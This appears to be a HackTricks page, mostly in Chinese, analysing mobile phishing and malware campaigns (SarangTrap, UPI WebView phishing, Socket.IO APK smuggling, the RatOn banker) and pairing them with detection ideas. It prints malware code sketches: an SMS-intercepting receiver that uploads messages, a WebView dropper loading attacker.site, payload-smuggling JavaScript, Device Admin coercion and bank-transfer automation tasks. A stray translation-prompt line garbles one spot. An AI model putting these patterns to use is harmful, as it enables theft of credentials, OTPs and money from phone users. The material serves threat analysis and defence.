# 移动钓鱼与恶意应用分发 (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 本页覆盖威胁行为者通过钓鱼（SEO、社会工程、假商店、约会应用等）分发 **malicious Android APKs** 和 **iOS mobile-configuration profiles** 的技术。
> 资料改编自 Zimperium zLabs（2025）披露的 SarangTrap 活动及其他公开研究。

## 攻击流程

1. **SEO/Phishing 基础设施**
* 注册大量相似域名（约会、云分享、汽车服务……）。
– 在 `<title>` 元素中使用本地语言关键词和表情以提升 Google 排名。
– 在同一落地页上同时托管 Android（`.apk`）和 iOS 的安装说明。
2. **第一阶段下载**
* Android：直接链接到一个未签名或“第三方商店”APK。
* iOS：`itms-services://` 或普通 HTTPS 链接到恶意 **mobileconfig** profile（见下文）。
3. **安装后社会工程**
* 首次运行时，应用要求输入一个 **invitation / verification code**（营造专属访问的错觉）。
* 该 code **通过 HTTP POST** 发送到 Command-and-Control (C2)。
* C2 回复 `{"success":true}` ➜ 恶意代码继续执行。
* 从未提交有效代码的 Sandbox / AV 动态分析看不到 **任何恶意行为**（规避检测）。
4. **运行时权限滥用（Android）**
* 危险权限仅在收到 C2 正面响应后才请求：
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* 近期变体 **从 `AndroidManifest.xml` 中移除了对 SMS 的 `<uses-permission>`**，但保留通过反射读取 SMS 的 Java/Kotlin 代码路径 ⇒ 在静态检测中评分降低，但在通过 `AppOps` 滥用或针对旧目标授予权限的设备上仍可工作。
5. **伪装界面与后台采集**
* 应用展示本地实现的无害视图（SMS viewer、gallery picker）。
* 同时窃取并外传：
- IMEI / IMSI、电话号码
- 全量 `ContactsContract` 导出（JSON 数组）
- 来自 `/sdcard/DCIM` 的 JPEG/PNG，使用 [Luban](https://github.com/Curzibn/Luban) 压缩以减小体积
- 可选的 SMS 内容（`content://sms`）
载荷以批量 zip 打包，通过 `HTTP POST /upload.php` 发送。
6. **iOS 投放技术**
* 单个 mobile-configuration profile 可以请求 `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` 等，从而将设备注册到类似 “MDM” 的监督模式。
* 社会工程安装提示：
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* 三次（钓鱼页面上有截图）。
3. Trust the unsigned profile ➜ 攻击者在不经过 App Store 审查的情况下获得 *Contacts* 与 *Photo* 授权。
7. **网络层**
* 明文 HTTP，常在 80 端口，HOST header 类似 `api.<phishingdomain>.com`。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（无 TLS → 易被发现）。

## 防御测试 / Red-Team 提示

* **动态分析绕过** – 在恶意软件评估时，使用 Frida/Objection 自动化 invitation code 阶段以到达恶意分支。
* **Manifest 与运行时差异** – 比较 `aapt dump permissions` 与运行时 `PackageManager#getRequestedPermissions()`；缺失的危险权限是一个异常信号。
* **网络探针** – 配置 `iptables -p tcp --dport 80 -j NFQUEUE` 以检测在输入 code 后出现的异常 POST 激增。
* **mobileconfig 检查** – 在 macOS 上使用 `security cms -D -i profile.mobileconfig` 列出 `PayloadContent` 并发现过度权限请求。

## Blue-Team 检测思路

* **Certificate Transparency / DNS Analytics** 以捕获大量关键词丰富的新域名。
* **User-Agent & Path Regex**：`(?i)POST\s+/(check|upload)\.php` 来自非 Google Play 的 Dalvik 客户端。
* **Invite-code 远程遥测** – APK 安装后不久出现 6–8 位数字代码的 POST 可能指示前期阶段。
* **MobileConfig 签名策略** – 通过 MDM 策略阻止未签名的配置描述文件。

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## 指标（通用）
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- 短链接 → GitHub Pages 钓鱼站点，仿冒合法门户
- 同一 GitHub 仓库托管一个带有假 “Google Play” 徽章的 APK，徽章直接链接到该文件
- 动态钓鱼页面托管在 Replit；远程命令通道使用 Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- 第一个 APK 是一个 installer (dropper)，其中携带真正的恶意软件于 `assets/app.apk`，并提示用户禁用 Wi‑Fi/移动数据以削弱云端检测。
- 嵌入的 payload 以无害标签安装（例如 “Secure Update”）。安装后，installer 和 payload 作为独立的 apps 共存。

静态排查提示（使用 grep 搜索嵌入的 payload）：
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### 通过短链动态发现端点
- Malware 从短链获取一个明文、逗号分隔的可用端点列表；简单的字符串转换生成最终的 phishing 页面路径。

示例（已脱敏）：
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
伪代码：
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### 基于 WebView 的 UPI 凭证窃取
- 步骤 “Make payment of ₹1 / UPI‑Lite” 在 WebView 内从动态端点加载攻击者 HTML 表单并捕获敏感字段（手机号、银行、UPI PIN），这些字段通过 `POST` 提交到 `addup.php`。

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### 自我传播和 SMS/OTP 拦截
- 首次运行时会请求大量敏感权限：
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 联系人会被循环遍历，以从受害者设备群发 smishing SMS。
- 传入的 SMS 会被 broadcast receiver 截获，并连同元数据（发送者、消息正文、SIM 卡槽、每台设备的随机 ID）上传到 `/addsm.php`。

接收器示意：
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) 作为弹性 C2
- payload 会向 FCM 注册；push 消息携带 `_type` 字段，作为触发动作的开关（例如，更新 phishing 文本模板、切换行为）。

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler 草图：
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting patterns and IOCs
- APK contains secondary payload at `assets/app.apk`
- WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
- SMS exfiltration to `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
- Apps labelled as generic “Update/Secure Update”
- FCM `data` messages with a `_type` discriminator in untrusted apps

### Detection & defence ideas
- Flag apps that instruct users to disable network during install and then side-load a second APK from `assets/`.
- Alert on the permission tuple: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-based payment flows.
- Egress monitoring for `POST /addup.php|/addsm.php` on non-corporate hosts; block known infrastructure.
- Mobile EDR rules: untrusted app registering for FCM and branching on a `_type` field.

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

攻击者越来越多地用嵌入在伪装为 Google Play 的诱饵中的 Socket.IO/WebSocket 通道替换静态 APK 链接。这样可以隐藏有效载荷 URL、绕过 URL/扩展名过滤，并保持逼真的安装用户体验。

在野外观察到的典型客户端流程：
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
为什么它能规避简单的防护措施：
- No static APK URL is exposed; payload is reconstructed in memory from WebSocket frames.
- URL/MIME/extension filters that block direct .apk responses may miss binary data tunneled via WebSockets/Socket.IO.
- Crawlers and URL sandboxes that don’t execute WebSockets won’t retrieve the payload.

Hunting and detection ideas:
- Web/network telemetry: flag WebSocket sessions that transfer large binary chunks followed by creation of a Blob with MIME application/vnd.android.package-archive and a programmatic `<a download>` click. Look for client strings like socket.emit('startDownload'), and events named chunk, downloadProgress, downloadComplete in page scripts.
- Play-store spoof heuristics: on non-Google domains serving Play-like pages, hunt for Google Play UI strings such as http.html:"VfPpkd-jY41G-V67aGc", mixed-language templates, and fake “verification/progress” flows driven by WS events.
- Controls: block APK delivery from non-Google origins; enforce MIME/extension policies that include WebSocket traffic; preserve browser safe-download prompts.

See also WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn 案例研究

The RatOn banker/RAT campaign (ThreatFabric) is a concrete example of how modern mobile phishing operations blend WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, and even NFC-relay orchestration. This section abstracts the reusable techniques.

### Stage-1: WebView → native install bridge (dropper)
攻击者展示一个指向恶意页面的 WebView，并注入一个 JavaScript interface 来暴露本地安装器。用户点击 HTML 按钮会调用本地代码，安装捆绑在 dropper assets 中的第二阶段 APK，然后直接启动它。

Minimal pattern:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
请粘贴页面的 HTML 内容或文件文本，我会按要求把其中的英文翻译成中文，并严格保留原有的 markdown/HTML 标签、链接与路径。
```html
<button onclick="bridge.installApk()">Install</button>
```
安装后，dropper 通过显式 package/activity 启动 payload:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: 不受信任的应用调用 `addJavascriptInterface()` 并向 WebView 暴露类似安装器的方法；APK 在 `assets/` 下携带嵌入的 secondary payload 并调用 Package Installer Session API。

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 打开一个 WebView，承载一个 “Access” 页面。该页面的按钮调用一个 exported 方法，导航受害者到 Accessibility 设置并请求启用恶意服务。一旦获批，malware 使用 Accessibility 自动点击后续的 runtime 权限对话框（contacts、overlay、manage system settings 等），并请求 Device Admin。

- Accessibility 可通过在节点树中查找类似 “Allow”/“OK” 的按钮并派发点击，程序化地帮助接受后续提示。
- Overlay 权限 检查/请求：
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
另见：

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### 通过 WebView 的覆盖式钓鱼/勒索
操作员可以发出命令以：
- 从 URL 渲染全屏覆盖，或
- 传递内联 HTML 并加载到 WebView 覆盖层中。

可能用途：胁迫（PIN 输入）、打开 wallet 以捕获 PIN、勒索消息。保留一个命令以在缺少时确保授予 overlay permission。

### 远程控制模型 – 文本伪屏 + screen-cast
- 低带宽：周期性地导出 Accessibility node tree，序列化可见文本/角色/边界，并作为伪屏发送到 C2（命令如 `txt_screen` 一次性，`screen_live` 持续）。
- 高保真：请求 MediaProjection 并按需开始 screen-casting/recording（命令如 `display` / `record`）。

### ATS playbook (bank app automation)
给定一个 JSON 任务，打开银行应用，通过 Accessibility 驱动 UI，混合文本查询和坐标点击，并在提示时输入受害者的付款 PIN。

示例任务:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
在一个目标流程中看到的示例文本 (CZ → EN):
- "Nová platba" → "新付款"
- "Zadat platbu" → "输入付款"
- "Nový příjemce" → "新增收款人"
- "Domácí číslo účtu" → "国内账户号码"
- "Další" → "下一步"
- "Odeslat" → "发送"
- "Ano, pokračovat" → "是，继续"
- "Zaplatit" → "付款"
- "Hotovo" → "完成"

运营者还可以通过像 `check_limit` 和 `limit` 这样的命令检查/提高转账限额，这些命令以类似方式导航限额 UI。

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- 立即锁定：
```java
dpm.lockNow();
```
- 使当前凭证过期以强制更改（无障碍功能捕获新的 PIN/密码）：
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- 通过禁用 keyguard 的生物识别功能来强制使用非生物识别解锁：
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
注：许多 DevicePolicyManager 控件在新版本 Android 上需要 Device Owner/Profile Owner；一些 OEM 构建可能宽松。始终在目标 OS/OEM 上验证。

### NFC relay orchestration (NFSkate)
Stage-3 可以安装并启动外部 NFC-relay 模块（例如 NFSkate），甚至将一个 HTML 模板传递给它以在中继过程中引导受害者。这可以在在线 ATS 的同时实现无接触的实体卡当面 cash-out。

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Detection & defence ideas (RatOn-style)
- 搜索使用 `addJavascriptInterface()` 的 WebViews，这些接口暴露 installer/permission 方法；以及以 “/access” 结尾并触发 Accessibility 提示的页面。
- 对在被授予 service 访问后短时间内生成高频率 Accessibility 手势/点击的应用发出警报；对像发送到 C2 的 Accessibility 节点转储一样的遥测进行告警。
- 监控不受信任应用中的 Device Admin 策略更改：`lockNow`、密码过期、keyguard 功能切换等。
- 对来自非企业应用的 MediaProjection 提示后随之周期性帧上传的情况发出警报。
- 检测由某个应用触发、安装或启动外部 NFC-relay 应用的行为。
- 针对银行业务：强制实施带外确认、绑定生物识别以及对抗设备上自动化的交易限额限制。

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
